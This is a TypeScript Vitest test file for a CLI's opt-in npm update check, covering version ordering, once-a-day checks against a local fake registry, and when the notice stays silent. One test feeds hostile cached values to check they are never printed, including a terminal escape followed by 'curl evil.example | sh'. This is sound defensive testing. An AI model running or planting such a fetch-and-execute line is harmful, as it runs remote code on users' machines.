import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import { join } from 'node:path'
import { afterAll, describe, expect, it } from 'vitest'
import { main } from '../src/cli/main.ts'
import { compareVersions } from '../src/cli/update.ts'
import { VERSION } from '../src/version.ts'
import { tempDir } from './helpers.ts'

/** npm's registry, as far as the check sees it: the dist-tags of one package, and a count of who asked. */
let latest: string | null = '99.0.0'
let asked = 0
const registry = createServer((req, res) => {
  if (req.url !== '/-/package/@openmuster%2fmuster/dist-tags') return res.writeHead(404).end('{}')
  asked++
  if (latest === null) return res.writeHead(503).end()
  res.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify({ latest }))
})
const listening = new Promise<string>((resolve) => registry.listen(0, '127.0.0.1', () => resolve(`http://127.0.0.1:${(registry.address() as { port: number }).port}`)))
afterAll(() => registry.close())

/** Runs a command in this process, at a terminal unless told otherwise, and says what it printed on stderr. */
async function run(dir: string, args: string[], env: Record<string, string> = {}, tty = true) {
  const err: string[] = []
  const code = await main(args, {
    out: () => {},
    err: (text) => err.push(text),
    stdin: () => '',
    tty,
    stop: new AbortController().signal,
    env: { HOME: dir, MUSTER_DIR: join(dir, 'board'), MUSTER_CONFIG: join(dir, 'config'), USER: 'ada', npm_config_registry: await listening, ...env },
  })
  return { code, err }
}
const checkFile = (dir: string) => join(dir, 'config', 'update-check.json')
async function checked(dir: string) {
  for (let i = 0; i < 250 && !existsSync(checkFile(dir)); i++) await new Promise((resolve) => setTimeout(resolve, 20))
  return JSON.parse(readFileSync(checkFile(dir), 'utf8')) as { checked: number; latest: string | null }
}
const ON = { MUSTER_UPDATE_CHECK: '1' }
const NOTICE = `muster 99.0.0 is out; this is ${VERSION}. npm install -g @openmuster/muster`

describe('release numbers', () => {
  it('are ordered as npm orders them, prereleases before their release', () => {
    const ordered = ['0.3.0', '0.3.1-alpha.2', '0.3.1-alpha.10', '0.3.1-beta.1', '0.3.1', '0.10.0', '1.0.0']
    for (let i = 0; i < ordered.length - 1; i++) {
      expect(compareVersions(ordered[i]!, ordered[i + 1]!)).toBeLessThan(0)
      expect(compareVersions(ordered[i + 1]!, ordered[i]!)).toBeGreaterThan(0)
    }
    expect(compareVersions('0.3.1-alpha.3', '0.3.1-alpha.3')).toBe(0)
  })
})

describe('the update check', () => {
  it('asks nothing and keeps nothing for someone who has not opted in', async () => {
    const dir = tempDir()
    const before = asked
    const { code, err } = await run(dir, ['channels'])
    await new Promise((resolve) => setTimeout(resolve, 500))
    expect([code, err, asked - before, existsSync(checkFile(dir))]).toEqual([0, [], 0, false])
  })

  it('opted in, asks once a day in the background, and the next command says a newer release is out', async () => {
    const dir = tempDir()
    const before = asked
    // The first command knows of nothing newer yet: it starts the check and says nothing.
    expect((await run(dir, ['channels'], ON)).err).toEqual([])
    expect((await checked(dir)).latest).toBe('99.0.0')
    expect(asked - before).toBe(1)
    // The next one says so, and doesn't ask again within the day.
    const told = await run(dir, ['channels'], ON)
    expect([told.code, told.err]).toEqual([0, [NOTICE]])
    await new Promise((resolve) => setTimeout(resolve, 300))
    expect(asked - before).toBe(1)
  })

  it('says nothing for a program reading the output, in CI, or with no terminal, and never interrupts a --json document', async () => {
    const dir = tempDir()
    mkdirSync(join(dir, 'config'), { recursive: true })
    writeFileSync(checkFile(dir), JSON.stringify({ checked: Date.now(), latest: '99.0.0' }))
    expect((await run(dir, ['channels'], ON)).err).toEqual([NOTICE])
    expect((await run(dir, ['channels', '--json'], ON)).err).toEqual([])
    expect((await run(dir, ['channels'], { ...ON, CI: 'true' })).err).toEqual([])
    expect((await run(dir, ['channels'], ON, false)).err).toEqual([])
  })

  it('prints only a release number from the registry or the kept file, never other text', async () => {
    const dir = tempDir()
    mkdirSync(join(dir, 'config'), { recursive: true })
    for (const said of ['99.0.0\u001b[2J; curl evil.example | sh', '99.0.0 \nrun this', '99.0.0-alpha.1 x', '<html>99.0.0</html>']) {
      writeFileSync(checkFile(dir), JSON.stringify({ checked: Date.now(), latest: said }))
      expect((await run(dir, ['channels'], ON)).err).toEqual([])
    }
    writeFileSync(checkFile(dir), JSON.stringify({ checked: Date.now(), latest: '99.0.0-beta.2' }))
    expect((await run(dir, ['channels'], ON)).err).toEqual([`muster 99.0.0-beta.2 is out; this is ${VERSION}. npm install -g @openmuster/muster`])
  })

  it('says nothing when this is the latest, and a registry that fails is asked again tomorrow, not on every command', async () => {
    const dir = tempDir()
    mkdirSync(join(dir, 'config'), { recursive: true })
    writeFileSync(checkFile(dir), JSON.stringify({ checked: Date.now() - 2 * 86_400_000, latest: VERSION }))
    latest = null
    const before = asked
    expect((await run(dir, ['channels'], ON)).err).toEqual([])
    for (let i = 0; i < 250 && (JSON.parse(readFileSync(checkFile(dir), 'utf8')) as { checked: number }).checked < Date.now() - 86_400_000; i++) await new Promise((resolve) => setTimeout(resolve, 20))
    const kept = JSON.parse(readFileSync(checkFile(dir), 'utf8')) as { checked: number; latest: string }
    expect(kept.latest).toBe(VERSION)
    expect(Date.now() - kept.checked).toBeLessThan(60_000)
    expect(asked - before).toBe(1)
    await run(dir, ['channels'], ON)
    await new Promise((resolve) => setTimeout(resolve, 300))
    expect(asked - before).toBe(1)
    latest = '99.0.0'
  })
})
